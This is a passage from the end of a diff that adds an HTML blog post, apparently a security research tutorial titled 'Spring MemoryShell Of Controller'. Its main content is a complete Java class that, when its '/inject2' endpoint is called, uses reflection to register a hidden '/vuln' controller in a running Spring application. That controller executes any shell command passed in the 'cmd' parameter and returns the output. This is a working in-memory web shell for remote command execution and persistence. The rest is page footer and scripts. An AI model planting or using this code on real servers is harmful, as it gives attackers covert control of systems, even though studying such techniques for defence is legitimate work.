&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springmemoryshell.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 适用于SpringMVC+Tomcat的环境，以及Springboot 2.6+环境</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringControllerMemShell2</span> &#123;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/inject2&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">SpringControllerMemShell2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">vulnMethod</span> <span class="operator">=</span> VulnController2.class.getMethod(<span class="string">&quot;exp&quot;</span>);</span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/vuln&quot;</span>)</span><br><span class="line">                    .options(config)</span><br><span class="line">                    .build();</span><br><span class="line">            <span class="type">VulnController2</span> <span class="variable">vulnController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnController2</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info, vulnController, vulnMethod);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnController2</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">VulnController2</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/05/19/Spring-Controller/1713493654995-1d7b2350-c810-4c90-8b70-b3f5d3aeb13d.png" alt="image.png"></p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">过程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8CContext"><span class="toc-number">3.1.</span> <span class="toc-text">注册Context</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Root-Context"><span class="toc-number">3.1.1.</span> <span class="toc-text">Root Context</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Child-Context"><span class="toc-number">3.1.2.</span> <span class="toc-text">Child Context</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8CController"><span class="toc-number">3.2.</span> <span class="toc-text">注册Controller</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">注册流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">应用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">4.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">动态注入</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&text=Spring MemoryShell Of Controller"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&title=Spring MemoryShell Of Controller"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&is_video=false&description=Spring MemoryShell Of Controller"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Spring MemoryShell Of Controller&body=Check out this article: https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&title=Spring MemoryShell Of Controller"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&title=Spring MemoryShell Of Controller"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&title=Spring MemoryShell Of Controller"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&title=Spring MemoryShell Of Controller"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&name=Spring MemoryShell Of Controller&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2024/05/19/Spring-Controller/&t=Spring MemoryShell Of Controller"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2023-2025
+        H3rmesk1t
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">Home</a></li><!--
+        --><!--
+          --><li><a href="/archives/">Writing</a></li><!--
+        --><!--
+          --><li><a href="/tags/">Tag</a></li><!--
+        --><!--
+          --><li><a href="/search/">Search</a></li><!--
+        --><!--
+          --><li><a href="/about/">About</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'H3rmesk1t/h3rmesk1t.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = '💬';
+      var utterances_theme = 'github-light';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
